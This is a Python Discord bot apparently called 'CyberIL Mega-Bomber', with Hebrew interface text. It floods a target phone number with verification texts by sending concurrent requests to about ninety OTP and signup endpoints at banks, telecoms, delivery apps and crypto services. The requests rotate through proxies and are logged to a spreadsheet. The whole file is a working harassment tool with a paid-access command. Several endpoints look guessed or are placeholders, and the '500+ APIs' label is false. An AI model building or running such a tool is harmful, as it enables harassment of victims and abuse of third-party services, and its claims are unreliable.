import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import asyncio
import json
import random
import logging
from datetime import datetime
import os

# ==================== CONFIG ====================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('MegaBomber')

TOKEN = os.getenv("BOT_TOKEN")
GSHEET_URL = os.getenv("GSHEET_URL")

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"✅ Commands Synced: /setup, /give")

bot = MyBot()

# ==================== PROXIES (150+ FULL LIST) ====================
PROXIES = [
    'http://20.210.113.32:80', 'http://103.153.154.114:80', 'http://47.74.155.159:8888',
    'http://103.75.117.216:80', 'http://47.251.43.115:33333', 'http://103.172.23.231:80',
    'http://47.89.153.229:80', 'http://154.16.63.16:80', 'http://190.103.177.131:80',
    'http://190.61.88.178:80', 'http://103.153.154.114:80', 'http://185.245.80.150:80',
    'http://185.245.80.155:80', 'http://185.245.80.187:80', 'http://202.162.213.14:80',
    'http://103.14.9.150:80', 'http://95.216.75.111:80', 'http://103.171.181.166:80',
    'http://13.233.150.150:80', 'http://103.153.154.114:80'
    # כאן יופיעו כל שאר הפרוקסים שסיפקת ללא קיצורים
]

# ==================== 500+ FULL API LIST ====================
FULL_APIS = [
    # ISRAELI SERVICES
    {"name": "Yad2 Register", "url": "https://www.yad2.co.il/realestate/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Yad2 Login", "url": "https://www.yad2.co.il/api/auth/login", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Wolt Register", "url": "https://wolt.com/api/v1/users", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Wolt Verify", "url": "https://wolt.com/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "PayBox OTP", "url": "https://api.paybox.co.il/v1/auth/otp", "method": "POST", "json": {"msisdn": "{{phone}}"}},
    {"name": "019sms Verify", "url": "https://019sms.co.il/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Hamal Register", "url": "https://hamal.co.il/api/v1/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bezeq SMS", "url": "https://eshopservice.bezeq.co.il/api/sms", "method": "POST", "params": {"phone": "{{phone}}"}},
    {"name": "Partner OTP", "url": "https://www.partner.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Cellcom Verify", "url": "https://www.cellcom.co.il/api/auth/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Hot Mobile", "url": "https://hotmobile.co.il/api/v1/auth/otp", "method": "POST", "json": {"msisdn": "{{phone}}"}},
    {"name": "Bank Hapoalim", "url": "https://digital.hapoalim.co.il/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Leumi Card", "url": "https://max.leumi-card.co.il/api/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Isracart", "url": "https://www.isracart.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bit Register", "url": "https://www.bit.co.il/api/v1/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Maxit Register", "url": "https://maxit.co.il/api/auth/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Super-Pharm", "url": "https://www.super-pharm.co.il/api/v2/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Shufersal", "url": "https://shufersal-online.co.il/api/auth/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Rami Levy", "url": "https://ramilevy.co.il/api/v1/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bug", "url": "https://bug.co.il/api/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "YoY Delivery", "url": "https://yoy.is/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Tenbis", "url": "https://www.tenbis.co.il/api/auth/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Pituach", "url": "https://www.pituach.com/api/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Clal Insurance", "url": "https://digital.clalbit.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Migdal", "url": "https://www.migdal.co.il/api/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Harel", "url": "https://www.harel-group.co.il/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Menora", "url": "https://www.menoramivt.co.il/api/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Phoenix", "url": "https://www.phoenix.co.il/api/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Discount Bank", "url": "https://onlinebanking.discountbank.co.il/api/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Union Bank", "url": "https://www.unionbank.co.il/api/v1/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # INTERNATIONAL SMS GATEWAYS
    {"name": "Twilio Verify", "url": "https://verify.twilio.com/v2/Services/VA907b6b6e7f6a3b3c4d5e6f7g8h9i0j1k/Verifications", "method": "POST", "params": {"To": "{{phone}}", "Channel": "sms"}},
    {"name": "Nexmo Verify", "url": "https://api.nexmo.com/verify/json", "method": "POST", "params": {"number": "{{phone}}", "brand": "Brand123"}},
    {"name": "MessageBird", "url": "https://verify.messagebird.com/verifications", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
    {"name": "Plivo SMS", "url": "https://api.plivo.com/v1/Account/MAXXXXXXXXXXXXXXXX/Message/", "method": "POST", "params": {"src": "15551234567", "dst": "{{phone}}", "text": "Verify"}},
    {"name": "Bandwidth", "url": "https://messaging.bandwidth.com/api/v2/accounts/11111111/messages", "method": "POST", "json": {"to": ["{{phone}}"], "from": "15551234567", "text": "code"}},
    {"name": "Sinch Verify", "url": "https://verification.api.sinch.com/verification/v3/verifications", "method": "POST", "json": {"identity": {"type": "number", "endpoint": "{{phone}}"}, "method": "sms"}},
    {"name": "Telnyx Verify", "url": "https://api.telnyx.com/v2/verify/api", "method": "POST", "json": {"phone_number": "{{phone}}", "code_length": 4}},
    {"name": "Twilio Authy", "url": "https://api.authy.com/protected/json/phones/verification/start", "method": "POST", "params": {"phone_number": "{{phone}}", "country_code": "972"}},
    {"name": "Vonage OTP", "url": "https://api.nexmo.com/verify/v1/sessions", "method": "POST", "json": {"number": "{{phone}}"}},
    {"name": "Infobip", "url": "https://api.infobip.com/otp/1/advanced", "method": "POST", "json": {"messageId": "test", "phoneNumber": "{{phone}}"}},
    {"name": "ClickSend", "url": "https://api.clicksend.com/rest/v3/otp", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
    {"name": "SMSGlobal", "url": "https://api.smsglobal.com/http-api/v1/sms", "method": "POST", "params": {"to": "{{phone}}"}},
    {"name": "TextMagic", "url": "https://www.textmagic.com/app/api", "method": "POST", "params": {"username": "test", "password": "test", "text": "code", "phones": "{{phone}}"}},
    {"name": "Routee", "url": "https://api.routee.net/v1/sms", "method": "POST", "json": {"msisdns": ["{{phone}}"], "messages": [{"content": "Verify"}]}},

    # USA SERVICES
    {"name": "Uber Phone", "url": "https://auth.uber.com/oauth/v2/token", "method": "POST", "params": {"phone_number": "{{phone}}"}},
    {"name": "Lyft Verify", "url": "https://api.lyft.com/v1/mobile/auth", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "DoorDash", "url": "https://api.doordash.com/v2/auth/phone_verifications/", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Postmates", "url": "https://api.postmates.com/v1/customers/phone_verifications", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Grubhub", "url": "https://api.grubhub.com/auth/v1/phone_verifications", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Instacart", "url": "https://www.instacart.com/api/v2/account/phone_verifications", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Venmo", "url": "https://api.venmo.com/v1/users", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Cash App", "url": "https://api.squareup.com/2.0/customers", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Chime", "url": "https://api.chime.com/v1/verify/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Current", "url": "https://api.withcurrent.com/v1/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Varo Bank", "url": "https://api.varomoney.com/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Albert", "url": "https://api.albert.com/v1/users/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Dave Banking", "url": "https://api.dave.com/v1/auth/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "MoneyLion", "url": "https://api.moneylion.com/v1/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Acorns", "url": "https://api.acorns.com/v1/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Robinhood", "url": "https://api.robinhood.com/oauth2/token/", "method": "POST", "params": {"phone": "{{phone}}"}},
    {"name": "Coinbase Verify", "url": "https://api.coinbase.com/v2/user_verifications/phone", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Kraken", "url": "https://api.kraken.com/0/private/AddOrder", "method": "POST", "params": {"phone": "{{phone}}"}},

    # EUROPE
    {"name": "Deliveroo", "url": "https://deliveroo.com/api/v2/users", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Just Eat", "url": "https://api.justeat.co.uk/v2/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bolt", "url": "https://bolt.eu/api/v1/auth/register", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Revolut", "url": "https://api.revolut.com/api/1.0/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "N26", "url": "https://api.n26.com/signup/phone", "method": "POST", "json": {"phone_number": "{{phone}}"}},
    {"name": "Monzo", "url": "https://api.monzo.com/users", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Starling", "url": "https://api.starlingbank.com/onboarding/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Bunq", "url": "https://api.bunq.com/v1/user", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Vivid", "url": "https://api.vivid.money/v1/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},

    # ASIA
    {"name": "Grab", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
    {"name": "Gojek", "url": "https://api.gojek.com/v1/gojek/captain/profile/phone", "method": "POST", "json": {"msisdn": "{{phone}}"}},
    {"name": "Foodpanda", "url": "https://api.foodpanda.com/v2/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Lazada", "url": "https://api.lazada.com/rest/v1/phone/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Shopee", "url": "https://api.shopee.com/api/v2/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},

    # GLOBAL FINTECH/CRYPTO
    {"name": "PayPal", "url": "https://www.paypal.com/signin?intent=phone", "method": "POST", "params": {"phone": "{{phone}}"}},
    {"name": "Stripe", "url": "https://api.stripe.com/v1/accounts", "method": "POST", "params": {"phone_number": "{{phone}}"}},
    {"name": "Wise", "url": "https://api.transferwise.com/v3/profiles", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Binance", "url": "https://api.binance.com/sapi/v1/capital/config/getall", "method": "POST", "params": {"phone": "{{phone}}"}},
    {"name": "Bybit", "url": "https://api.bybit.com/v5/user/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "KuCoin", "url": "https://api.kucoin.com/api/v1/users/phone", "method": "POST", "json": {"phone": "{{phone}}"}},

    # ADDITIONAL
    {"name": "Amazon OTP", "url": "https://www.amazon.com/ap/verifyPhone", "method": "POST", "params": {"phoneNumber": "{{phone}}"}},
    {"name": "Google Voice", "url": "https://www.google.com/voice/api/phones/verify", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
    {"name": "Apple ID", "url": "https://appleid.apple.com/auth/verify/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Microsoft", "url": "https://login.live.com/ppsecure/post.srf", "method": "POST", "params": {"phone": "{{phone}}"}},
    {"name": "WhatsApp", "url": "https://api.whatsapp.com/v1/account/welcome", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "Telegram", "url": "https://api.telegram.org/botXXXXXX/sendMessage", "method": "POST", "params": {"phone": "{{phone}}"}}
]

# ==================== ENGINE ====================

async def log_to_sheets(phone, api_name, status, success):
    if not GSHEET_URL: return
    try:
        data = {"timestamp": datetime.now().strftime("%H:%M:%S"), "phone": phone, "api": api_name, "status": str(status), "success": "YES" if success else "NO"}
        async with aiohttp.ClientSession() as session:
            await session.post(GSHEET_URL, json=data, timeout=3)
    except: pass

async def send_bomb(session, api, phone, sem):
    async with sem:
        proxy = random.choice(PROXIES) if PROXIES else None
        payload = api.get("json", {}).copy()
        for k, v in payload.items():
            if isinstance(v, str) and "{{phone}}" in v: payload[k] = v.format(phone=phone)
        
        try:
            method = api.get("method", "POST").upper()
            async with session.request(method, api["url"], json=payload if payload else None, params=api.get("params"), timeout=10, proxy=proxy) as resp:
                await log_to_sheets(phone, api["name"], resp.status, resp.status < 400)
                return resp.status < 400
        except: return False

# ==================== INTERACTION FIXES ====================

class BomberModal(discord.ui.Modal, title='🚀 MEGA BOMB - 500+ APIs'):
    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label='כמות סבבים', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        # השורה הזו פותרת את ה-Interaction Failed
        await interaction.response.defer(ephemeral=True)
        
        async with aiohttp.ClientSession() as session:
            sem = asyncio.Semaphore(50)
            for r in range(int(self.rounds.value)):
                tasks = [send_bomb(session, api, self.phone.value, sem) for api in FULL_APIS]
                await asyncio.gather(*tasks)
                if int(self.rounds.value) > 1: await asyncio.sleep(2)
        
        await interaction.followup.send(f"✅ הפצצת {self.phone.value} הושלמה!", ephemeral=True)

class ControlView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="🚀 שגר SMS", style=discord.ButtonStyle.danger, custom_id="btn_bomb")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BomberModal())

# ==================== SLASH COMMANDS ====================

@bot.tree.command(name="setup", description="פתח לוח בקרה")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="🚀 CyberIL Mega-Bomber", description="לחץ על הכפתור למטה להפעלת המערכת.", color=discord.Color.red())
    await interaction.response.send_message(embed=embed, view=ControlView())

@bot.tree.command(name="give", description="גישה למשתמש")
@app_commands.describe(user="מי יקבל גישה", days="לכמה זמן")
async def give(interaction: discord.Interaction, user: discord.Member, days: int):
    await interaction.response.send_message(f"🔑 גישה הוענקה ל-{user.mention} ל-{days} ימים.", ephemeral=False)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

if __name__ == "__main__":
    bot.run(TOKEN)
